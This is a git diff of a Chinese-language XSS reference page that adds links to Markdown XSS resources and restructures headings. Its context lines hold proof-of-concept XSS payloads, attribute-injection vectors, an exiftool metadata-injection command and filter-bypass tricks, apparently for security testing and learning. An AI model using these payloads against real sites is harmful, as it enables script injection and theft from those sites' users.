@@ -41,6 +41,8 @@
 - [挖洞经验 | 看我如何发现亚马逊网站的反射型XSS漏洞](https://www.freebuf.com/articles/web/175606.html)
 - [How I alert(1) in Azure DevOps](https://5alt.me/2019/02/xss-in-azure-devops/)
 - [Stored XSS to Organisation Takeover](https://infosecwriteups.com/stored-xss-to-organisation-takeover-6eaaa2fdcd5b)
+- [[BugBounty] XSS with Markdown — Exploit & Fix on OpenSource](https://lethanhphuc-pk.medium.com/bugbounty-xss-with-markdown-exploit-fix-on-opensource-1baecebe9645) - markdown xss 案例
+
 
 **相关工具**
 - [s0md3v/XSStrike](https://github.com/s0md3v/XSStrike) - XSS 检测工具,效果一般
@@ -104,6 +106,7 @@
 - [bugbounty-cheatsheet/cheatsheets/xss.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
 - [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 - [aurebesh.js – Translate JavaScript to Other Writing Systems](https://aem1k.com/aurebesh.js/)
+- [cujanovic/Markdown-XSS-Payloads](https://github.com/cujanovic/Markdown-XSS-Payloads) - XSS payloads for exploiting Markdown syntax
 
 **Tips**
 - **Firefox 关闭 xss 过滤器**
@@ -116,9 +119,9 @@
 
 ---
 
-# 基础
+## 基础
 
-## 什么是 XSS
+### 什么是 XSS
 
 跨站点脚本 (XSS) 攻击是一种注入，Web 程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了 HTML 页面的原有逻辑，攻击者可以利用该漏洞执行恶意 HTML/JS 代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。
 
@@ -128,16 +131,16 @@ XSS 攻击有 3 种类型：
 - 存储型 XSS : 存储型是将注入的脚本永久存储在目标服务器上的攻击
 - 基于DOM的XSS : 一种在 DOM 结构中而不是在 HTML 代码中触发的 XSS。
 
-## XSS Payload
+### XSS Payload
 
-### 最基础的
+#### 最基础的
 ```html
 <script>alert(1)</script>
 <svg/onload=alert(1)>
 <img src=x onerror=alert(1)>
 ```
 
-### 在标签内部的
+#### 在标签内部的
 ```html
 " onmouseover=alert(1)
 " autofocus onfocus=alert(1)
@@ -283,7 +286,7 @@ ${alert(1)}
 </script>
 ```
 
-### 用在其他功能点
+#### 用在其他功能点
 
 **文件名**
 ```
@@ -312,12 +315,12 @@ exiftool -Artist='"><script>alert(1)</script>' test.jpeg
 
 ---
 
-# Bypass
+## 绕过技巧
 
 1. 使用无害的 payload,类似`<b>,<i>,<u>`观察响应,判断应用程序是否被 HTML 编码,是否标签被过滤,是否过滤 `<>` 等等;
 2. 如果过滤闭合标签,尝试无闭合标签的 payload `<b,<i,<marquee` 观察响应;
 
-## 长度限制
+### 长度限制
 
 **绕过长度限制**
 ```js
@@ -326,7 +329,7 @@ exiftool -Artist='"><script>alert(1)</script>' test.jpeg
 --><script>alert(xss);<script>
 ```
 
-## 内容检测
+### 内容检测
 
 **换行**
 ```js
